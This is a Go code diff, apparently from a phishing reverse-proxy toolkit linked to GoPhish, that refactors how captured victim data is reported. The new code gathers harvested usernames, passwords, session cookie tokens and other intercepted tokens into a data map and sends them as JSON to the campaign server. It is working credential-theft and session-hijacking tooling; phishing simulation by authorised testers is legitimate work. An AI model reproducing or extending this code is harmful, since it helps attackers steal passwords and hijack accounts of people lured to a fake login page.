@@ -17,14 +17,9 @@ type GoPhish struct {
 }
 
 type ResultRequest struct {
-	Address   string `json:"address"`
-	UserAgent string `json:"user_agent"`
-	Username   string `json:"username"`
-	Password string `json:"password"`
-	Custom map[string]string `json:"custom"`
-	Tokens string `json:"tokens"`
-	HttpTokens map[string]string `json:"http_tokens"`
-	BodyTokens map[string]string `json:"body_tokens"`
+	Address   string                 `json:"address"`
+	UserAgent string                 `json:"user-agent"`
+	Data      map[string]interface{} `json:"data"`
 }
 
 func NewGoPhish() *GoPhish {
@@ -107,23 +102,29 @@ func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophi
 		return err
 	}
 
-	var req ResultRequest
-	if !gophishSessions {
-		req = ResultRequest{
-			Address:   session.RemoteAddr,
-			UserAgent: session.UserAgent,
+	data := make(map[string]interface{})
+	if gophishSessions {
+		data["username"] = session.Username
+		data["password"] = session.Password
+		if len(session.CookieTokens) != 0 {
+			data["cookies"] = (*Terminal).cookieTokensToJSON(nil, session.CookieTokens)
 		}
-	} else {
-		req = ResultRequest{
-			Address:   session.RemoteAddr,
-			UserAgent: session.UserAgent,
-			Username: session.Username,
-			Password: session.Password,
-			Custom: session.Custom,
-			Tokens: (*Terminal).cookieTokensToJSON(nil, session.CookieTokens),
-			HttpTokens: session.HttpTokens,
-			BodyTokens: session.BodyTokens,
+
+		for k, v := range session.Custom {
+			data[k] = v
 		}
+		for k, v := range session.BodyTokens {
+			data[k] = v
+		}
+		for k, v := range session.HttpTokens {
+			data[k] = v
+		}
+	}
+
+	req := ResultRequest{
+		Address:   session.RemoteAddr,
+		UserAgent: session.UserAgent,
+		Data:      data,
 	}
 
 	content, err := json.Marshal(req)
